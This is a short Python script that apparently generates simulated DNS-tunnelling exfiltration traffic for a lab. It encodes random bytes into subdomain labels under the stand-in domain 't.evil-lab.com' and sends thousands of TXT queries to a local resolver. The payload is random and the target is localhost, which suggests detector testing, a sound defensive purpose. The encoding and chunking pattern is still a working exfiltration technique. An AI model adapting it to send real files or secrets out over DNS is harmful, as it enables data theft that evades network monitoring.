import base64, os, random, time, sys, socket
from dnslib import DNSRecord, QTYPE

SERVER = ("127.0.0.1", 5353)
DOMAIN = "t.evil-lab.com"

def send(qname, qtype):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(1)
    s.sendto(DNSRecord.question(qname, qtype).pack(), SERVER)
    try: s.recvfrom(4096)
    except Exception: pass
    s.close()

def run(mode="b32", chunk=30, delay=(0.001, 0.01), qtype="TXT", n=3000):
    for _ in range(n):
        raw = os.urandom(chunk)
        enc = base64.b32encode(raw).decode().strip("=").lower() if mode == "b32" else raw.hex()
        # split into labels of at most 60 chars
        labels = [enc[i:i+60] for i in range(0, len(enc), 60)]
        send(".".join(labels) + "." + DOMAIN, qtype)
        time.sleep(random.uniform(*delay))

if __name__ == "__main__":
    # args: mode chunk qtype n
    run(sys.argv[1], int(sys.argv[2]), qtype=sys.argv[3], n=int(sys.argv[4]))
